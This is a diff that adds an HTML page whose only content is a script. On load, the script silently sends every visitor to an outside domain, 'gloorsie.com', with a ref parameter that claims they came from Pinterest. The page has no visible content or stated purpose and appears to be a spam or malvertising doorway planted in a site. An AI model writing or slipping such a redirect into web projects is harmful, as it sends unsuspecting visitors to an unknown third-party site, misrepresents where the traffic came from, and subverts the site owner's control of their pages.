@@ -1,0 +1,7 @@
+<html>
+<head>
+    <script>
+        window.location.href = "https://gloorsie.com/4/7107142//?ref=https://www.pinterest.com/";
+    </script>
+</head>
+</html>
